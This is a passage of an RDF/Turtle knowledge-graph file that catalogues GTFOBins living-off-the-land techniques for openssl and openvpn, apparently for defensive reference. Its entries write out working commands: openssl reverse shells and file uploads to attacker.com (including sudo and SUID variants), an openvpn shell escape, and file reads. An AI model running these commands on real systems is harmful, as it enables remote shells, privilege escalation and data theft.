./od -An -c -w9999 "$LFILE"
""" .

mknd:command_openssl-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openssl-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """To send the file run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send

Fetch a file from a TCP port, transmission will be encrypted.
""" ;
    d3f:uses mknd:executable_openssl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openssl ;
    mknd:provides mknd:function_file-download ;
    mknd:value """RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
""" .

mknd:command_openssl-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openssl-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_openssl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openssl ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
openssl enc -in "$LFILE"
""" .

mknd:command_openssl-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openssl-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """To collect the file run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save

Send a local file via TCP. Transmission will be encrypted.
""" ;
    d3f:uses mknd:executable_openssl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openssl ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
""" .

mknd:command_openssl-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openssl-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_openssl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openssl ;
    mknd:provides mknd:function_file-write ;
    mknd:value """LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
openssl enc -in "$TF" -out "$LFILE"
""",
        """LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
""" .

mknd:command_openssl-library-load a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openssl-library-load" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_openssl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openssl ;
    mknd:provides mknd:function_library-load ;
    mknd:value "openssl req -engine ./lib.so" .

mknd:command_openssl-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openssl-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
""" ;
    d3f:uses mknd:executable_openssl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openssl ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
""" .

mknd:command_openssl-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openssl-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
""" ;
    d3f:uses mknd:executable_openssl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openssl ;
    mknd:provides mknd:function_sudo ;
    mknd:value """RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
""" .

mknd:command_openssl-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openssl-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
""" ;
    d3f:uses mknd:executable_openssl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openssl ;
    mknd:provides mknd:function_suid ;
    mknd:value """LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
""",
        """RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
""" .

mknd:command_openvpn-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openvpn-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The file is actually parsed and the first partial wrong line is returned in an error message." ;
    d3f:uses mknd:executable_openvpn ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openvpn ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
openvpn --config "$LFILE"
""" .

mknd:command_openvpn-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openvpn-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_openvpn ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openvpn ;
    mknd:provides mknd:function_shell ;
    mknd:value """openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
""" .

mknd:command_openvpn-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openvpn-sudo" ;
